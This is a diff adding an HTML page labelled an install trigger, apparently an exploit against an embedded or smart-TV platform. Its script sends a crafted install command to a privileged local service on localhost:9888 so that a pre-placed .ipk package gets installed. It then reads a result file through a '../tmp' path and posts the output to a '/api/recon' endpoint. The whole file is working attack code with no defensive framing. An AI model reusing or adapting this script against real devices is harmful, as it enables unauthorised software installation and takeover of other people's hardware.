@@ -1,0 +1,42 @@
+<!doctype html>
+<!-- superwatch install trigger for 09.09O: command id 53 (IPK_INSTALL_COMMAND
+     from pkgmgr/PackageInstall.js). sw2.js and installer.ipk are already placed. -->
+<html><head><meta charset="utf-8"><title>trigger-53</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace"><pre id="o">trigger…</pre>
+<script>
+(function () {
+  "use strict";
+  var O = document.getElementById('o');
+  function log(m) { O.textContent += "\n" + m; return m; }
+  function post(t) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/api/recon", true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(JSON.stringify({ tag: "tr53", at: new Date().toISOString(), report: { log: t } }));
+    } catch (e) {}
+  }
+  var SID = 77;
+  var CMD = SID + ":53:" + SID + ";/APPS/installer.ipk;re.installer;";
+  setTimeout(function () {
+    var res = [];
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "https://localhost:9888/function/basic/fetch/sw2", false);
+      x.setRequestHeader("identifier", "");
+      x.send(JSON.stringify({ list: [CMD] }));
+      res.push("sw2 -> " + String(x.responseText || "").slice(0, 400));
+    } catch (e) { res.push("EXC " + e.name + ": " + e.message); }
+    setTimeout(function () {
+      try {
+        var r = HiUtils_createRequest("fileRead", { path: "../tmp/ipk_install_result", mode: 6 });
+        var msg = r.msg;
+        if (msg != null && typeof msg === "object") msg = JSON.stringify(msg);
+        res.push("result file: ret=" + r.ret + " " + String(msg == null ? "" : msg).slice(0, 400));
+      } catch (e) { res.push("result file EXC " + e); }
+      post(res.join("\n"));
+      log(res.join("\n"));
+    }, 6000);
+  }, 1500);
+})();
+</script></body></html>
